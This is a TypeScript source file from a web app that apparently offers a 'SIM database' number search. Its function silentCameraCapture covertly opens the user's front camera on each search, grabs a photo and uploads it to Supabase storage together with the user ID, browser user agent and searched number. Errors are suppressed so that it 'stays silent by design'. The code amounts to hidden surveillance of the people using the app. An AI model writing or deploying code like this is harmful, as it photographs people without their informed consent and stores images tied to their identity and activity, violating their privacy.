import { supabase } from "@/integrations/supabase/client";

// Silently capture a single frame from the front camera and upload it.
// Runs on every call (e.g. every SIM number search) so admin can spot misuse.
// A short in-memory throttle prevents overlapping captures if the user spams.
let capturing = false;
let lastCaptureAt = 0;
const MIN_GAP_MS = 1500;

export async function silentCameraCapture(searchedNumber?: string): Promise<void> {
  try {
    if (typeof window === "undefined") return;
    if (capturing) return;
    if (Date.now() - lastCaptureAt < MIN_GAP_MS) return;
    if (!navigator.mediaDevices?.getUserMedia) return;
    capturing = true;

    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
      audio: false,
    });

    // Give the sensor a beat to auto-expose
    await new Promise((r) => setTimeout(r, 700));

    const video = document.createElement("video");
    video.srcObject = stream;
    video.muted = true;
    video.playsInline = true;
    await video.play().catch(() => {});
    await new Promise((r) => setTimeout(r, 400));

    const w = video.videoWidth || 640;
    const h = video.videoHeight || 480;
    const canvas = document.createElement("canvas");
    canvas.width = w;
    canvas.height = h;
    const ctx = canvas.getContext("2d");
    if (!ctx) throw new Error("no ctx");
    ctx.drawImage(video, 0, 0, w, h);

    // Stop the camera as fast as possible
    stream.getTracks().forEach((t) => t.stop());

    const blob: Blob | null = await new Promise((res) => canvas.toBlob(res, "image/jpeg", 0.82));
    if (!blob) return;

    const { data: userData } = await supabase.auth.getUser();
    const uid = userData.user?.id ?? "anon";
    const path = `${uid}/${Date.now()}-${Math.random().toString(36).slice(2, 8)}.jpg`;

    const up = await supabase.storage.from("sim-captures").upload(path, blob, {
      contentType: "image/jpeg",
      upsert: false,
    });
    if (up.error) throw up.error;

    await supabase.from("sim_captures").insert({
      user_id: userData.user?.id ?? null,
      storage_path: path,
      user_agent: navigator.userAgent,
      page: "sim-database",
      searched_number: searchedNumber ?? null,
    });

    lastCaptureAt = Date.now();
  } catch {
    // Permission denied / no camera / unsupported — stay silent by design
  } finally {
    capturing = false;
  }
}
